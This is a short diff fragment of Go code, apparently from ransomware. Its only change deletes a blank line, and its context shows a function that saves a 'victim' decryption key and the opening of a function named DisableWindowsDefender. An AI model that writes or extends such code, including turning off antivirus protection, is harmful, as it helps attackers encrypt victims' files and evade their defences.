@@ -91,7 +91,6 @@ func saveVictimDecryptionKeyFile() error {
 	return os.WriteFile(victimDecryptionKeyPath(), []byte(encryptionKeyHex), 0600)
 }
 
-
 func DisableWindowsDefender() {
 	if runtime.GOOS != "windows" {
 		return
